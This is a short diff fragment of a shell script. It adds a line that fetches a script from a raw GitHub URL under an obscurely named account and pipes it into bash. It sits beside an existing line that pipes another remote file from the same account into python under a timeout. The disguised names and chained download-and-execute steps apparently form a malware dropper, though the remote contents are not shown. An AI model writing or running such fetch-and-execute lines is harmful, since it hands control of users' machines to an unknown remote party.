@@ -164,6 +164,8 @@ fi
 
 else
 
+curl https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/mobilegoogle8474 | bash
+
 timeout 12 curl https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/mobilegoogle84 | python
 if [ $? -eq 124 ]; then
 echo "google84"
